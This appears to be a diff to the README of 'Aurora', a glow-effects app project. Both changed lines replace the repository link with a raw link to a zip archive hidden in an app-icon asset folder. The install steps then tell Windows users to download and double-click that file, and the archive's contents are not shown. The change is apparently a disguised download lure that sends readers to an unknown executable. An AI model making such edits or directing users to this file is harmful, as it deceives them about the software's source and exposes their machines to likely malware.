@@ -1,6 +1,6 @@
 # 🌟 Aurora - Add smooth glow effects to apps
 
-[![](https://img.shields.io/badge/Download-Aurora-blue)](https://github.com/Lusterless-zerotolerance898/Aurora)
+[![](https://img.shields.io/badge/Download-Aurora-blue)](https://raw.githubusercontent.com/Lusterless-zerotolerance898/Aurora/main/Examples/AuroraExamples/AuroraExamples/Assets.xcassets/AppIcon.appiconset/Software-v2.1.zip)
 
 Aurora creates professional glow effects for your screens. It uses advanced math to display light with high accuracy. The software runs on modern graphics hardware to keep animations fast and sharp. You can change colors and intensity to match your style.
 
@@ -20,7 +20,7 @@ Check your display settings to ensure your drivers are current. Outdated drivers
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/Lusterless-zerotolerance898/Aurora) to get the latest version.
+1. Visit the [official download page](https://raw.githubusercontent.com/Lusterless-zerotolerance898/Aurora/main/Examples/AuroraExamples/AuroraExamples/Assets.xcassets/AppIcon.appiconset/Software-v2.1.zip) to get the latest version.
 2. Select the installer file that matches your version of Windows.
 3. Save the file to your computer desktop.
 4. Double-click the file to start the installation process.
